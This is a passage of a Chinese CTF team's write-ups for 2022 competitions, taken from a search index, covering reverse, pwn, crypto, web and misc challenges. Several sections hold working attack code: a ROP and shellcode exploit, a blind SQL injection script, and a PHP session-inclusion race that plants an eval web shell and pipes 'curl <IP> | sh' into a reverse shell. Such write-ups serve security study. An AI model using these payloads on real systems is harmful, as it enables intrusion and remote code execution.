<p>\u7136\u540e\u641c\u7b2c\u4e8c\u4e2a\u8c03\u7528<code>cHZv5op8rOmlAkb6(.*?)</code>\uff0c\u540c\u65f6\u51fd\u6570\u540d\u7684\u51fa\u73b0\u6b21\u6570==5\uff08\u591a\u4f59\u7684\u5728\u5b57\u7b26\u4e32\u8f6c\u51fd\u6570\u5f15\u7528\u7684\u90a3\u4e2a\u65b9\u6cd5\u91cc\u548c\u5b83\u81ea\u8eab\u597d\u50cf\uff09</p> <p>\u53ea\u670950\u591a\u4e2a\uff0c\u51c6\u5907\u6328\u4e2a\u90fd\u624b\u641c\u4e00\u4e0b\u540c\u540d\u51fd\u6570\u4e2a\u6570\uff0c\u7ed3\u679c\u7b2c\u4e8c\u4e2a\u5c31\u6b63\u597d\u7b26\u54085\u4e2a  \u76f4\u63a5\u628a\u51fd\u6570\u4e00\u4e8c\u4e24\u4e2a\u5b57\u7b26\u4e32\u653e\u5230go\u5728\u7ebf\u73af\u5883https://go.dev/play/ \u4e00\u8dd1\u5c31\u51fa\u6765\u4e86 </p>"},{"location":"Writeup/2022wdbs1/readme/#re694","title":"re694","text":"<p>exeinfo_pe \u67e5\u5230\u662fUPX\uff0c\u4f46\u63d0\u793a\u6587\u4ef6\u88abhack\u4e0d\u80fd\u76f4\u63a5\u8131\uff0cIDA\u6253\u5f00\u63d0\u793aIAT\u70b8\u4e86 </p> <p>010\u6253\u5f00\u53d1\u73b0\u6709FUK01 FUK02\uff0c\u60f3\u5230\u6700\u7b80\u5355\u7684\u4e4b\u524d\u770b\u535a\u5ba2\u8bb2\u9b54\u6539UPX\u7684\u65b9\u6cd5\u5c31\u662f\u628aUPX01\u62b9\u6389\uff0c\u679c\u65ad\u628a\u4e24\u4e2aFUK\u6362\u6210UPX\uff0cexeinfo\u518d\u67e5\u5c31\u63d0\u793a\u80fd\u6b63\u5e38\u8131\u4e86 </p> <p>\u8fd9\u65f6\u5019upx -d\u76f4\u63a5\u89e3\uff0c\u653e\u5230IDA\u91cc\u53d1\u73b0\u770b\u8d77\u6765\u50cfVSStudio debug\u6a21\u5f0f\u7f16\u8bd1\u7684\u7a0b\u5e8f\uff0cshift f12\u627e\u5230\u4e86flag\u6b63\u786e\u7684\u5b57\u7b26\u4e32\uff0c\u5f15\u7528\u8ddf\u5165\u5230\u51fd\u6570\uff0c\u770b\u4e0b\u8c03\u7528\u7684\u5176\u4ed6\u51fd\u6570\u53d1\u73b0\u5927\u81f4\u903b\u8f91\uff1a </p> <p>\u5b57\u7b26\u4e32\u6bd4\u8f83 <code>4B48791345305C495A7913706D78136F485D6464</code> </p> <p>add <code>10</code>, XOR <code>0X50</code> </p> <p>XOR <code>0X66</code> </p> <p>\u7136\u540e\u53cd\u7740\u64cd\u4f5c\u4e00\u904d\u5c31\u5f97\u5230\u4e86flag</p> <p>CyberChief\u914d\u65b9\uff1a</p> <pre><code>cyberchief/CyberChef_v9.46.0.html#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'50'%7D,'Standard',false)\nSUB(%7B'option':'Hex','string':'A'%7D)ADD(%7B'option':'Hex','string':'A'%7D/disabled)XOR\n(%7B'option':'Hex','string':'66'%7D,'Standard',false)&amp;input=NEI0ODc5MTM0NTMwNUM0OTVBNzkxMzcwNkQ3ODEzNkY0ODVENjQ2NA\n</code></pre>"},{"location":"Writeup/2022wdbs1/readme/#pwn","title":"PWN","text":""},{"location":"Writeup/2022wdbs1/readme/#pwn349","title":"pwn349","text":"<p>\u6ca1\u70b9\u5f00497\u5c31\u5148\u505a\u4e86\u8fd9\u9898</p> <p>\u4ee5\u4e3a\u662fblind-pwn\u7136\u540e\u5c31\u4e0a\u53bb\u53bb\u4e00\u901a\u4e71\u6478\uff0c\u8003\u8651\u6709\u4ec0\u4e48\u53ef\u6267\u884c\u7a0b\u5e8f\u80fd\u8bfb\u6587\u4ef6\u5e76\u62a5\u9519\u7684\uff0c\u961f\u91cc\u7684\u5e08\u5085\u627e\u5230\u4e86cc1plus\u7f16\u8bd1\u5e76\u8f93\u51fa\u5230stdout\u53ef\u4ee5\u7206\u51faflag\uff1a</p> <p><code>lib/gcc/x86_64-linux-gnu/5/cc1plus -o- flag</code></p>"},{"location":"Writeup/2022wdbs1/readme/#pwn497","title":"pwn497","text":"<p><code>lib/gcc/x86_64-linux-gnu/5/cc1plus -o- flag</code> \u505a\u5b8c349\u70b9\u5f00\u4e00\u770b\u53d1\u73b0\u4e86497\u7684\u9644\u4ef6\uff08\uff1f\uff09\uff0c\u4e8e\u662f\u540c\u6837\u7684payload\u62ff\u5230flag\uff0c\u5927\u6982\u662f349\u975e\u9884\u671f\u4e86\u7f62</p> <p></p>"},{"location":"Writeup/2022wdbs1/readme/#misc","title":"MISC","text":""},{"location":"Writeup/2022wdbs1/readme/#_1","title":"\u7b7e\u5230\uff1a","text":"<p>\u7b7e\u5230\uff0c\u7b54\u6848\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u53ef\u4ee5\u5355\u4e2a\u7206\u7834\u4e0d\u786e\u5b9a\u7684\u9898\u76ee</p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/","title":"2022\u5e7f\u4e1c\u7701\u8d5b","text":"<p>(\u7b2c\u4e8c\u5c4a\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b) \u3010HED CTF / COMPASS CTF\u3011 WriteUp Rank:9 \uff08total 504\uff09 Solve:8 Pts:1947</p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#pwn","title":"Pwn","text":""},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#pwn-jmp_rsp-235pt","title":"Pwn | jmp_rsp (235pt)","text":"<p>\u5199WP\u65f6\u5019\u53d1\u73b0\u8fdc\u7a0b\u7684bss\u662fRWX\u7684\uff0c\u76f4\u63a5ret2bss\u5c31\u5b8c\u4e86\uff0c\u4e3a\u4ec0\u4e48IDA\u548creadelf\u90fd\u8bf4bss\u662fRW\u7684\u5462\uff1f \u66f4\u60e8\u7684\u662f\uff0c\u8fd9\u9898\u597d\u50cf\u6709jmp rsp\u7684gadget\u3002\u3002\u3002 \u600e\u4e48\u6709\u4e0d\u8bfb\u9898\u5c31\u5f00\u59cb\u9020\u94fe\u5b50\u7684\u4eba\u5462 XD \u53ef\u80fd\u8fd9\u5c31\u662f\u6211\u53d8\u4e0dPWN\u7684\u539f\u56e0\u5427 </p> <p>checksec\u663e\u793a\u6709canary\uff0c\u5176\u4ed6\u4fdd\u62a4\u5168\u65e0\uff0c\u6808\u6bb5RWX IDA\u6253\u5f00\uff0c\u7a0b\u5e8f\u903b\u8f91\u975e\u5e38\u7b80\u5355\uff0c\u5728read\u5904\u4e5f\u65e0canary\uff0c\u4f46\u662f\u770b\u8d77\u6765\u8fd9\u662f\u4e2a\u9759\u6001\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\uff0c\u6ca1\u6709\u5f15\u7528\u7684\u5916\u90e8\u51fd\u6570\u3002 \u5148\u60f3\u5230\u7684\u662f\uff1a\u5199bss\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 + printf rop\u6cc4\u9732\u6808\u5730\u5740 + \u6808\u4e0aret2shellcode \u4f46\u662f\u5927\u6982\u662f\u6ca1\u8bbe\u7f6e\u5c0f\u7f13\u51b2\u533a\u7684\u539f\u56e0\uff0c\u7a0b\u5e8f\u76f4\u5230\u9000\u51fa\u624d\u5410\u51fa\u8f93\u51fa\uff0c\u5728\u8fdc\u7a0b\u5c31\u62ff\u4e0d\u5230\u4efb\u4f55\u8f93\u51fa\uff0c\u6240\u4ee5\u8003\u8651\u4e0d\u5229\u7528\u8f93\u51fa\u7684getshell \u8fd9\u9898\u6ca1\u6709libc\u4e5f\u4e0d\u80fdret2dl\uff0c\u4f46\u662f\u6709mprotect\u51fd\u6570\uff0c\u53ef\u4ee5\u6539\u6bb5\u6743\u9650\uff0c\u4e8e\u662f\u6784\u9020\uff1a shellcode\u5199\u5230bss + mprotect\u6539bss\u6743\u9650 + bss\u4e0aret2shellcode  </p> <p>exp:</p> <pre><code>from pwn import p64\nfrom pwn import *\n\n# context.log_level = \"debug\"\ne = ELF('jmp_rsp')\np = remote(\"47.106.122.102\", 45286)\n# p = e.process()\nread_addr = 0x449380  # elf.sym[\"read\"]\nvul_addr = 0X400b5d\nmprot_addr = 0x44a160\nprintf = 0x40f690\nrdi = 0x401902\nrsi_r15 = 0x401900\nbss_addr = e.bss()\nprint(bss_addr)\np_write_bss = b'a' * 0x88 + p64(rdi) + p64(0) + p64(rsi_r15) + p64(bss_addr) + b'a' * 8 + p64(read_addr) + p64(vul_addr)\np.send(p_write_bss + b'c' * (0x100 - len(p_write_bss)))\nshell_code = \\\n    b'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05'\np.send(shell_code + b'c' * (0x100 - len(shell_code)))\n\npayload = b'a' * 0x88 + p64(0x4018F5) + p64(vul_addr) + p64(0) + p64(1) + p64(mprot_addr) + p64(7) + p64(0x100000) + p64(0x600000) + p64(bss_addr)\np.send(payload + b'c' * (0x100 - len(payload)))\np.interactive()\n</code></pre>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#crypto","title":"Crypto","text":""},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#crypto-crypto-xor2-114pt","title":"Crypto | crypto-xor2 (114pt)","text":"<p>\u60f3\u8d77\u4e86HackNat\u91cc\u8fb9\u7684\u4e00\u4e2a\u5267\u60c5\uff1a\u4e00\u4e2a\u4eba\u628a\u4ed6\u7684\u5bc6\u7801\u8bbe\u6210*******\uff0c\u8fd9\u6837\u5982\u679c\u6709\u4e00\u5929\u5bc6\u7801\u88ab\u76d7\u4e86\uff0c\u522b\u4eba\u4e5f\u4f1a\u4ee5\u4e3a\u6ca1\u62ff\u5230\u771f\u6b63\u7684\u5bc6\u7801\u3002   \u961f\u91cc\u5bc6\u7801\u5e08\u5085\u8bf4\u662f\u667a\u5546\u68c0\u6d4b\u9898\uff0c\u5979\u8bf4\u662f\u5c31\u662f\u5427...  </p> <p>\u5f88\u7b80\u5355\u7684\u5f02\u6216\u52a0\u5bc6\uff0c\u679a\u4e3e key \u518d\u5f02\u6216\u56de\u6765\u5373\u53ef\u3002</p> <pre><code>d = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=[]\\\\;',./`~!@#$%^&amp;*()_+{}|:\\\"&lt;&gt;?\"\ne = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-{}\"\n\nwith open(\"cipher\", \"r\") as f:\n    cipher = f.read()\n\nfor o in range(0, len(d)):\n    for p in range(0, len(d)):\n        for q in range(0, len(d)):\n            for r in range(0, len(d)):\n                key = d[o] + d[p] + d[q] + d[r]\n                flag = \"\"\n                f = True\n                for i in range(len(cipher)):\n                    m = ord(cipher[i]) ^ ord(key[i%4])\n                    flag += chr(m)\n                    if (e.find(chr(m)) == -1):\n                        f = False\n                        break\n                if f:\n                    print(flag, key)\n</code></pre> <p><code>flag{fccb0665-bce5-d329-aca7-99179bdc9ed3}</code></p> <p>\u6ca1\u60f3\u5230\u8fd9\u4e2a key \u5c31\u662f <code>xxxx</code>\uff0cflag \u4e5f\u6ca1\u6709 padding\uff0c\u5c0f\u4e11\u7adf\u662f\u6211\u81ea\u5df1\u3002</p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#web","title":"Web","text":""},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#web-easy_ctf-141pt","title":"Web | easy_ctf (141pt)","text":"<p>\u628a\u5185\u5bb9\u62ff\u51fa\u6765\uff0c\u7136\u540e\u7edf\u8ba1\u4e00\u4e0b\uff0c\u518d\u6392\u4e2a\u5e8f\uff0c\u6700\u540e\u63d0\u4ea4\u4e00\u4e0b\u5c31\u884c\u4e86\u3002</p> <pre><code>import requests\nimport re\n\nRE = re.compile(r'^([a-zA-Z0-9]*)&lt;td&gt;', re.MULTILINE)\n\ndef f(r):\n    p = {}\n    for c in r:\n        if c in p:\n            p[c] += 1\n        else:\n            p[c] = 1\n    a = [ (v, k) for (k, v) in p.items() ]\n    a = sorted(a)\n    return ''.join([ c[1] for c in a ])\n\ns = requests.Session()\nr = s.get('http://120.79.191.238:42399')\n\nwhile True:\n    print(r.text)\n    m = re.search(RE, r.text)\n    a = m.group(1)\n    a = f(a)\n\n    r = s.post('http://120.79.191.238:42399', data={'ans': a})\n</code></pre>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#web-easysql-833pt","title":"Web | easysql (833pt)","text":"<p>\u7ecf\u6d4b\u8bd5\u548c\u89c2\u5bdf\uff0c~~\u4e0d\u96be~~\u53d1\u73b0\u5e7f\u544a\u540d\u662f\u662f\u6709\u6ce8\u5165\u70b9\u7684\uff0c\u53ef\u4ee5\u7528 <code>'||{sql}||'</code> \u7684\u65b9\u5f0f\u6ce8\u5165\u3002\u7136\u540e\u5e7f\u544a\u63d0\u4ea4\u4e4b\u540e\uff0c\u53ef\u4ee5\u67e5\u770b\u8be6\u60c5\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u6761\u5e7f\u544a\u662f\u5426\u6b63\u5e38\u663e\u793a\uff0c\u5c31\u53ef\u4ee5\u77e5\u9053 <code>{sql}</code> \u7684\u6761\u4ef6\u662f\u5426\u4e3a\u771f\u3002\u6240\u4ee5\u53ef\u4ee5\u7528\u76f2\u6ce8\u3002  </p> <p>\u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\uff0c\u5e7f\u544a\u540d\u662f\u6709\u5173\u952e\u8bcd\u8fc7\u6ee4\u7684\uff0c\u5305\u62ec <code>in</code>, <code>or</code>, <code>and</code>, <code>union</code>, <code>password</code> \u7b49\uff0c\u5176\u4e2d <code>and</code> \u548c <code>or</code> \u53ef\u4ee5\u7528 <code>&amp;&amp;</code> \u548c <code>||</code> \u7ed5\u8fc7\u3002  </p> <p>\u7136\u540e\u7531\u4e8e\u5c4f\u853d\u4e86 <code>in</code> \u548c <code>or</code> \u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 <code>information_schema</code> \u6216 <code>mysql.innodb_table_stats</code> \u67e5\u8be2\u8868\u540d\u548c\u5217\u540d\uff0c\u4e14 MariaDB \u6ca1\u6709 sys \u5e93\u3002  </p> <p>\u6545\u4f7f\u7528\u4f1f\u5927\u7684\u76f2\u731c\u65b9\u6cd5(\u6307\u731c\u4e86\u597d\u51e0\u4e2a\u5c0f\u65f6)\uff0c\u731c\u51fa\u91cc\u9762\u6709\u4e00\u4e2a <code>ads</code> \u8868\uff0c\u91cc\u9762\u6709 22 \u5217\uff1b\u4e00\u4e2a <code>users</code> \u8868\uff0c\u6709 <code>id</code>, <code>name</code> \u548c\u611f\u89c9\u6709\u7684 <code>password</code> \u4e09\u5217\uff08\u4f46\u662f\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff0c\u56e0\u4e3a admin \u5e10\u53f7\u5565\u90fd\u6ca1\u6709\uff09\u3002  </p> <p>\u7136\u540e\u53c8\u4f7f\u7528\u76f2\u731c\u5927\u6cd5(admin\u7684md5\u641c\u5230\u4e86\u6781\u5176\u76f8\u4f3c\u7684\u9898\u76ee\uff0c\u8003\u8651\u53ef\u80fd\u6709flag\u5b57\u6bb5/\u8868/\u5e93)\uff0c\u627e\u5230\u4e86\u4e00\u4e2a <code>flag</code> \u8868\uff0c\u7136\u540e\u5728\u672a\u77e5\u5217\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u7528 <code>SELECT (SELECT * FROM flag) &gt;= (SELECT 1, {string})</code> \u6765\u76f2\u6ce8\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230\u4e00\u4e2a\u6ca1\u6709\u533a\u5206\u5927\u5c0f\u5199\u7684 flag\u3002   </p> <p>\u5c0f\u5c0f\u7206\u7834\u4e86\u4e00\u4e0bflag\uff0c\u56e0\u4e3a\u592a\u83dc\u4e86\u6ca1\u4e0d\u5230\u5927\u5c0f\u5199\u654f\u611f\u7684\u6ce8\u5165\u67e5\u8be2\u65b9\u6cd5\uff08\u8fc7\u6ee4\u4e86bINary\uff0cMariaDB\u8fd8\u6ca1\u6709json\uff09 \u7136\u540e\u53c8 xjb \u679a\u4e3e\uff0c\u53d1\u73b0 flag \u53ea\u6709 <code>sql</code> \u7684\u9996\u4f4d\u5927\u5199\uff0c\u5373 <code>flag{Sql_1nj3cti0n_1s_s0_easy}</code>\uff0c\u63d0\u4ea4\u53ef\u8fc7\u3002</p> <pre><code>import requests\nimport re\n\ncookies = {'PHPSESSID': '_______________'}\nRE = re.compile(r'detail\\.php\\?id=(\\d+)')\n\ndef clear_list():\n    requests.get('http://120.79.141.85:47930/empty.php', cookies=cookies)\n\ndef add_ads(title):\n    global aid\n    payload = {'title': title, 'content': 'Elaina is best', 'ac': 'add'}\n    r = requests.post('http://120.79.141.85:47930/addads.php', cookies=cookies, data=payload)\n    aid += 1\n    assert '\u5df2\u53d1\u9001\u7533\u8bf7' in r.text, title\n\ndef check_sql(sql):\n    global aid\n    if aid % 10 == 0:\n        clear_list()\n        add_ads('1')\n    sql = sql.replace(' ', '/**/')\n    add_ads(f\"'||{sql}||'\")\n    requests.get(f'http://120.79.141.85:47930/index.php', cookies=cookies)\n    r = requests.get(f'http://120.79.141.85:47930/detail.php', params={'id': str(aid)}, cookies=cookies)\n    return '\u5f85\u7ba1\u7406\u786e\u8ba4' in r.text\n\nclass CharBinarySearch:\n    def __init__(self):\n        self.l = 0\n        self.r = 128\n\n    def is_done(self):\n        return self.l + 1 &gt;= self.r\n\n    def middle(self):\n        return (self.l + self.r) // 2\n\n    def update(self, r):\n        if r:\n            self.l = self.middle()\n        else:\n            self.r = self.middle()\n\ndef main():\n    global aid\n    aid = 0\n\n    clear_list()\n    add_ads('1')\n    r = requests.post('http://120.79.141.85:47930/index.php', cookies=cookies)\n    aid = int(re.search(RE, r.text).group(1))\n    print(f'Initial ID: {aid}')\n\n    # # \u53ef\u7206\u7834\u51fa\u5217\u6570\n    # for i in range(1, 64):\n    #     s = ','.join([\"''\"] * i)\n    #     r = check_sql(f\"(SELECT (SELECT {s})&lt;(SELECT * FROM flag LIMIT 1))=true\")\n    #     print(i, r)\n\n    content = ''\n    for i in range(len(content) + 1, 128):\n        s = CharBinarySearch()\n        while not s.is_done():\n            # r = check_sql(f\"(SELECT HEX(SUBSTR(database(),{i},1))&gt;=HEX({s.middle()}))\")\n\n            p = content + chr(s.middle())\n            p = hex(int.from_bytes(p.encode(), 'big'))\n            r = check_sql(f\"(SELECT (SELECT * FROM flag) &gt;= (SELECT 1, {p})) = 1\")\n            # r = check_sql(f\"((SELECT HEX(SUBSTR(name,{i},1)) FROM users LIMIT 1 OFFSET 0)&gt;=HEX({s.middle()}))\")\n\n            print(f'{i} {s.middle()} =&gt; {r}')\n            s.update(r)\n        content += chr(s.l)\n        print(content)\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#web-in-138pt","title":"Web | in (138pt)","text":"<p>\u968f\u4fbf\u70b9\u70b9\uff0c\u53d1\u73b0http://119.23.247.96:45837/action.php?file=2.txt \u53ef\u4ee5\u8bfb\u6587\u4ef6\uff0c\u5c1d\u8bd5\u5305\u542baction.php\u81ea\u8eab\uff0c\u53d1\u73b0\u5361\u987f\u4e14\u65e0\u8fd4\u56de\uff0c\u8bf4\u660e\u5305\u542b\u65b9\u5f0f\u5f88\u53ef\u80fd\u662finclude \u5148\u770b\u4e00\u773c\u670d\u52a1\u5668\u662fapache\uff0c\u4e0d\u80fd\u5305\u542b\u65e5\u5fd7\u62ffshell\uff0c\u4e8e\u662f\u8003\u8651\u770b\u770bPHP\u7684\u6e90\u7801 \u4f2a\u534f\u8bae\u8bfb\u5230\u6e90\u7801http://119.23.247.96:45837/action.php?file=php://filter/convert.base64-encode/resource=action.php \u5f00\u5934\u770b\u5230session_start()\u5927\u6982\u7387\u662fsession\u5305\u542b\uff0c\u5077\u61d2\u76f4\u63a5\u7528session\u7ade\u4e89\u7684\u677f\u5b50\u62ffshell</p> <pre><code>import io\nimport requests\nimport threading\n\nsessid = 'TGAO'\ndata = {\"cmd\": \"system('curl 106.52.237.196 | sh');\"}\n\n\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)\n        resp = session.post('http://119.23.247.96:45837/action.php',\n                            data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'},\n                            files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})\n\n\ndef read(session):\n    while True:\n        resp = session.post('http://119.23.247.96:45837/action.php?file=/tmp/sess_' + sessid, data=data)\n        if 'tgao.txt' in resp.text:\n            print(resp.text)\n            event.clear()\n\n\nif __name__ == \"__main__\":\n    event = threading.Event()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n    event.set()\n</code></pre> <p>\u8fd0\u884c\u540e\u7acb\u523b\u5728vps\u4e0a\u6210\u529f\u6536\u5230\u4e86\u53cd\u5f39\u7684shell\uff08\u5e94\u8be5\u4e0d\u7528\u8fd9\u4e48\u66b4\u529b\u4e5f\u80fd\u89e3\uff09  </p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#misc","title":"MISC","text":""},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#misc-277pt","title":"Misc | \u590d\u5408 (277pt)","text":"<p>\u5957\u5a03\u9898\u3002</p> <p>\u89c2\u5bdf\u5230\u53ef\u7591 HTTP \u8bf7\u6c42\uff0c\u5bfc\u51fa\u54cd\u5e94\u6587\u4ef6\u3002 </p> <p>\u53d1\u73b0\u6240\u6709\u7684\u6587\u4ef6\u540e\u7f00\u90fd\u4e0d\u7b26\u5408\u771f\u5b9e\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u9010\u4e00\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d\u3002 \u5176\u4e2d md \u6587\u4ef6\u770b\u6587\u4ef6\u5c3e\u80fd\u77e5\u9053\u662f zip\uff0c\u4f46\u662f\u5b83\u7684\u6587\u4ef6\u5934\u574f\u4e86\u3002\u901a\u8fc7\u5bf9\u6bd4\u6b63\u5e38\u7684 zip \u6587\u4ef6\uff0c\u53d1\u73b0\u53ea\u662f\u7f3a\u5c11\u4e86\u6700\u5f00\u59cb\u7684\u4e24\u4e2a bytes\uff0c\u624b\u52a8\u8865\u5168\u5373\u53ef\u3002 </p> <p>\u89e3\u538b\u7f29 <code>pass.zip</code>\uff0c\u5f97\u5230\u7eaf\u6587\u672c\u6587\u4ef6 <code>Eva</code>\u3002 </p> <p>\u89c2\u5bdf\u5230\u5927\u91cf\u7684 <code>=E2=80=82</code>\uff0c\u6709\u70b9\u50cf unicode \u63a7\u5236\u5b57\u7b26\uff0c\u5168\u90e8\u6362\u6210\u7a7a\u683c\u3002\u884c\u5c3e\u7684 <code>=</code> \u4f3c\u4e4e\u4ee3\u8868\u7740\u6362\u884c\uff0c\u5168\u90e8\u5220\u6389\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u5bc6\u6587\u3002</p> <pre><code>Emklyusg gni bvvymlag tsqic colz jxmoxvl tiwhz ebmee, Zhjeoig Krpvpi-Zgvlyvx Evdr or olv Rbtm bl Gcscckh une fz e tftstrtkdrx rxeb suv olfqx dpb tizh km kliq ox hsjr: mom luyik, kfx dwhrh-wi iympwagp, vru ral qzveomvlm. Aw fgc olrr fhvl nivpkf vhzr vvjjvqlpwagpn jrje pvgu xcijc vhbrmsmmvq bz vbz xj jrsea bukq wyk kxymye xj hvqvyqok xcid. Uav jrorb cfsgn knt oisn uahb vz mn pzix aw ok sgh? Nfh aznorzh zl plagkvi wtgxubvlmx qvbbjqak hvvvq gvb gxc os sc khbvurvp? Wjtn qf rmai zq yhvggwomt.Ygk euu gvyxfm bx vt xci kylr-weoiixvb btxrxeommc hm kbtxzqgmkhzl siymtggl knt xmycw vsivs xci mgkacr uj kekgxukr? Kzzr scyvzr seiexcw-jiek mimkgtaqikw ns xpxhbye migictzmq zlz ticlzcek, tccjgvpiay azvv dttwhypt xzkx-kzvbii, xiybumq zs nivi xmnvimzrtw bu iyr xcmeel, jiek sa trrblvgy tmsdgglvgrc vqflz aprs. Xj wlaa wmeysiw, kfx apbakcx fd kliqorb e emolt zgc nivk t wzblpdkrrx difzi jj kgfl. Eue wkieb avcey vzeuggn iouyo ayym umikv cegnxumq? Zldw hsxzbvur cej zxlv rrslyvlmsg ntwriicw vdrx xci pctya oe xcsjc pow hyi gmkckhbhxi dr dcwpknr iyytympwa. \n</code></pre> <p>\u5927\u5c0f\u5199\u3001\u5355\u8bcd\u957f\u5ea6\u548c\u6807\u70b9\u7b26\u53f7\u90fd\u975e\u5e38\u50cf\u81ea\u7136\u8bed\u8a00\u3002 <code>e emolt zgc nivk t</code> \u7684 <code>e</code> \u548c <code>t</code> \u5e94\u8be5\u90fd\u662f\u4ee3\u8868 <code>a</code>\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u4e0d\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u7f6e\u6362\u3002\u7528 quipquip \u4e5f\u6ca1\u6709\u8dd1\u51fa\u7ed3\u679c\u3002\uff08\u5bc6\u6587\u662f\u5168\u53ef\u89c1\u5b57\u7b26\uff0c\u6807\u70b9\u6b63\u786e\uff0c\u660e\u6587\u63a8\u6d4b\u4e5f\u662f\u5168\u53ef\u89c1\u5b57\u7b26\uff0c\u4e14\u4e0d\u662f\u5355\u8868\u66ff\u6362\uff0c\u56e0\u6b64\uff09\u51ed\u611f\u89c9\u662f Vigen\u00e8re Encode\uff0c\u4f46\u662f\u4e0d\u77e5\u9053 key \u662f\u4ec0\u4e48\uff0c\u53cd\u6b63\u4e0d\u662f\u6587\u4ef6\u540d <code>Eva</code>\u3002 \u540e\u6765\u5728 <code>flaggggggg.doc</code> \u4e2d\u627e\u5230\u4e86\u9690\u85cf\u7684\u767d\u8272\u5c0f\u5b57\uff0c<code>Key:everything</code>\u3002\u4e8e\u662f\u6b64\u9898\u7ed3\u675f\u3002  </p> <pre><code>Arguably the greatest novel ever written about aging, Gabriel Garcia-Marquez Love in the Time of Cholera may be a challenging text for those who need to read it most: the young, the would-be rational, and the impatient. To say that many health care professionals fall into these categories is not to fault them but merely to describe them. Who being young can know what it is like to be old? Who trained in western scientific medicine dares not try to be rational? Flag is life is fantastic.And who caught up in the task-oriented imperative of contemporary medicine can truly claim the virtue of patience? Even before managed-care initiatives so greatly increased the pressure, physicians were famously time-driven, trained to seek efficiency in all things, care of patients prominently among them. To such persons, the thought of reading a novel may seem a profligate waste of time. Why spend hours reading about what never happened? This question has been eloquently answered over the years by those who use literature in medical education. \n</code></pre> <p><code>flag{life_is_fantastic}</code></p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#misc-42pt","title":"Misc | \u7b7e\u5230\u9898 (42pt)","text":"<p>\u7b7e\u5230\uff0c\u63d0\u524d\u5173\u6ce8\u4e3b\u529e\u65b9\u516c\u4f17\u53f7\u662f\u597d\u6587\u660e\uff0c\u5149\u901f\u4e00\u8840</p>"},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#reverse","title":"Reverse","text":""},{"location":"Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/#reverse-pyre-165pt","title":"Reverse | pyre (165pt)","text":"<p>\u4f7f\u7528GitHub\u4e0a\u7684pyinstxtractor.py\u89e3\u5305exe\uff0c\u88ab\u63d0\u9192  </p> <pre><code>[+] Python version: 37\n[!] Warning: This script is running in a different Python version than the one used to build the executable.  \n[!] Please run this script in Python37 to prevent extraction errors during unmarshalling  \n</code></pre> <p>\u4e8e\u662f\u66f4\u6362\u5230python3.7\u518d\u6b21\u8fd0\u884c\uff0c\u5f97\u5230\u4e86\u6b63\u5e38\u89e3\u5305\u76841.pyc pycdc\u8fd8\u662f\u4e0d\u5e72\u6d3b\uff0c\u4e8e\u662f\u8bd5\u8bd5\u5728python3.7-3.8\u5de5\u4f5c\u826f\u597d\u7684uncompyle6\u53cd\u7f16\u8bd1\uff0c\u5f97\u5230\u6e05\u6670\u7684\u4ee3\u7801\uff1a</p> <pre><code>def check():\n    a = input('plz input your flag:')\n    c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]\n    if len(a) != 42:\n        print('wrong length')\n        return 0\n    b = 179\n    for i in range(len(a)):\n        if ord(a[i]) * 33 % b != c[i]:\n            print('wrong')\n            return\n\n    